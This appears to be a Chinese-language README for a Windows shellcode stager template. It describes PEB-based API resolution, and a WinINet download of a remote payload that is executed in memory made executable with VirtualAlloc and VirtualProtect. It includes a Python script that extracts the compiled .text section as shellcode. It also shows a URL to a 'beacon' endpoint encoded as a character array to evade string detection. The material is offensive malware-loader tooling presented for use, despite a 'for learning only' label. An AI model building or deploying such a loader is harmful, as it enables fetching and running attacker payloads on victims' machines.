





两年前用于制作shellcode的模板，仅用于学习和参考

## 特征

1. **动态加载系统库和函数**

   使用 `LoadLibraryA` 和 `GetProcAddress` 动态加载 `kernel32.dll` 和 `wininet.dll`，获取一些网络相关的函数。

2. **通过 PEB 获取 Kernel32.dll 基址**

   不同于直接调用 Windows API，它通过访问 PEB（进程环境块）来查找 Kernel32.dll 的地址。

3. **支持 x64 和 x86 架构**

   使用条件编译 (`_AMD64_`) 根据平台的不同使用不同的方式获取 DLL 和导出表地址。

4. **动态获取导出函数的地址**

   代码实现了一个 `GetProcAddress_Func` 函数，遍历 DLL 的导出表，找到所需的函数。

5. **动态堆内存读写**

   远程服务器下载内容，并将其存储在分配的内存区域中。通过指针运算将

   `addr + total_bytes` 写入指定内存的偏移位置。

6.  **加载和调用网络及内存相关的函数**

   使用 `InternetOpenA`、`InternetOpenUrlA`、`InternetReadFile` 等网络 API。

   使用 `VirtualAlloc` 和 `VirtualProtect` 进行内存管理，分配和更改内存区域的保护属性，使用指针 执行Shellcode。

   

## 说明

1.编译出来的exe，可以直接当作stager使用（远程shellcode加载器）

2.提取shellcode：

偏移量从0x400到0x7D0为.Text段的内容，用python脚本将这段内容提取出来

```python
import random

def extract():
    with open('shellcodeCode.exe','rb+') as file:
        with open('shellcode.bin', 'wb+') as save:
            save.write(bytes(file.read()[0x400:0x7D0]))
       
if __name__ == '__main__':
    extract()

```

URL只允许BYTE的字符数组形式的字符串，类似于这样：

```C++
 BYTE url[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '2', '7', '.', '0', '.', '0', '.', '1', ':', '8', '1', '8', '1', '/', 'b', 'e', 'a', 'c', 'o', 'n', 0 };
```

- 每个字符都用单引号 `''` 包裹，逐个字符作为 `BYTE`（即 `unsigned char`）存储在数组中。
- **字符串以 0 结尾**（即 **空字符 `0`**），这是 C 语言中的字符串终止符，标志字符串结束。